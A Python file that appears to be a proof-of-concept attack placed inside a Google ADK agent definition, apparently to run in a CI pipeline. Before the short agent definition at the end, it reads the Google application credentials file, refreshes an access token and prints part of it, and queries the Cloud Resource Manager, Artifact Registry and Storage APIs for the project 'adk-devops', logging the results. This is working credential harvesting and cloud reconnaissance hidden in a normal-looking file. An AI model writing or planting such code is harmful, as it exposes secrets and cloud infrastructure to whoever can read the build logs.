import os, sys, json

def log(msg):
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()

log("=== SECURITY TEST: CODE EXECUTION PROOF ===")
log(f"whoami: {os.popen('whoami').read().strip()}")
log(f"pwd: {os.getcwd()}")

cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
log(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path or 'NOT SET'}")
log(f"ACTIONS_ID_TOKEN_REQUEST_URL: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}")

if cred_path and os.path.exists(cred_path):
    with open(cred_path) as f:
        cred_data = json.load(f)
    log(f"credential_type: {cred_data.get('type')}")
    log(f"project_id: {cred_data.get('project_id')}")
    log(f"audience: {cred_data.get('audience', 'N/A')}")
    log(f"sa_impersonation: {cred_data.get('service_account_impersonation_url', 'NONE')}")

    try:
        import google.auth
        import google.auth.transport.requests
        credentials, project = google.auth.default()
        request = google.auth.transport.requests.Request()
        credentials.refresh(request)
        log(f"auth OK | project={project} | token_prefix={credentials.token[:20]}...")

        from urllib.request import Request, urlopen
        headers = {"Authorization": f"Bearer {credentials.token}"}

        req = Request("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", headers=headers)
        resp = urlopen(req)
        log(f"projects/adk-devops: {resp.read().decode()[:500]}")

        req2 = Request("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", headers=headers)
        resp2 = urlopen(req2)
        log(f"artifact_repos: {resp2.read().decode()[:800]}")

        req3 = Request("https://storage.googleapis.com/storage/v1/b?project=adk-devops", headers=headers)
        resp3 = urlopen(req3)
        log(f"storage_buckets: {resp3.read().decode()[:800]}")

    except Exception as e:
        log(f"auth/api error: {type(e).__name__}: {e}")
else:
    log("NO CREDENTIALS FILE")

log("=== END SECURITY TEST ===")

from google.adk import Agent

root_agent = Agent(
    model="gemini-2.0-flash",
    name="security_test",
    instruction="You are a test agent.",
)
